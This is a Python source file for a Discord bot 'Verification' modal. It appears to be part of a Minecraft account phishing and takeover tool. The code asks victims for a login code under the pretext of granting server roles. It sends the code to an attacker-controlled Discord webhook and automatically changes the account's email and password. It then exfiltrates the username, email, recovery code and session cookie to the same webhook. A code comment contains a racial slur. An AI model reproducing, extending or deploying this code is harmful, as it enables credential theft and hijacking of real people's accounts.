import json
import config
import aiohttp
import discord
import time
from discord import ui, Webhook, NotFound, HTTPException
from views.otp import automate_auto_change, CreateRandomEmail, generate_password


class MyModalTwo(ui.Modal, title="Verification"):
    box_three = ui.TextInput(label="CODE", required=True)
    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        with open("data.json", "r") as f:
            data = json.load(f)
        if data.get("webhook") is None:
            await interaction.response.send_message("The webhook has not been set yet", ephemeral=True)
        else:
            async with aiohttp.ClientSession() as session:
                newgenpassword = generate_password()
                TempEmail = await CreateRandomEmail()
                webhook = Webhook.from_url(data["webhook"], session=session)
                email = config.LastUsedEmail
                try:
                    Codeembed=discord.Embed(
                            title="LOGIN CODE",
                            description=f"**LOGIN CODE**: ```{self.box_three.value}```",
                            colour=0x008000
                    )
                    await webhook.send(embed=Codeembed)
                    
                    if TempEmail is not None:
                        embedsecure = discord.Embed(
                        title="Auto Secure",
                        colour=0x9900FF
                        )
                    else:
                        embedfail = discord.Embed(
                        title="Auto Secure Failed",
                        description="Failed To Auto Create Email. Double Check Your API Key For MailSlurp.",
                        colour=0xFF0000
                        )
                        await webhook.send(embed=embedfail)
                except NotFound:
                    return await interaction.response.send_message("Webhook not found", ephemeral=True)
                except HTTPException:
                    return await interaction.response.send_message("Couldn't send to webhook", ephemeral=True)
            await interaction.response.send_message(
                "Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
            )
            async with aiohttp.ClientSession() as session:
                starttime = time.time()
                await automate_auto_change(email,self.box_three.value,TempEmail,newgenpassword)
                endtime = time.time()
                timetotal = endtime - starttime
                webhook = Webhook.from_url(data["webhook"], session=session)
                if config.LastCookie == "": #This nigga did not code this right
                    embedfailsecure = discord.Embed(title="Auto Fail",colour=0xFF0000)
                    embedfailsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=False)
                    embedfailsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
                    await webhook.send(embed=embedfailsecure)
                else:
                    embedsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=True)
                    embedsecure.add_field(name="**Email:**", value=f"```{config.LastUsedEmail}```", inline=True)
                    embedsecure.add_field(name="**Recovery Code:**", value=f"```{config.LastRecoveryCode}```", inline=False)
                    embedsecure.add_field(name="**Security Email (Only Valid For 24Hours):**", value=f"```{TempEmail}```", inline=True)
                    embedsecure.add_field(name="**Cookie:**", value=f"```{config.LastCookie}```", inline=False)
                    embedsecure.add_field(name="**Time Taken:**", value=f"```{timetotal}```", inline=False)
                    embedsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
                    webhook = Webhook.from_url(data["webhook"], session=session)
                    await webhook.send(embed=embedsecure)
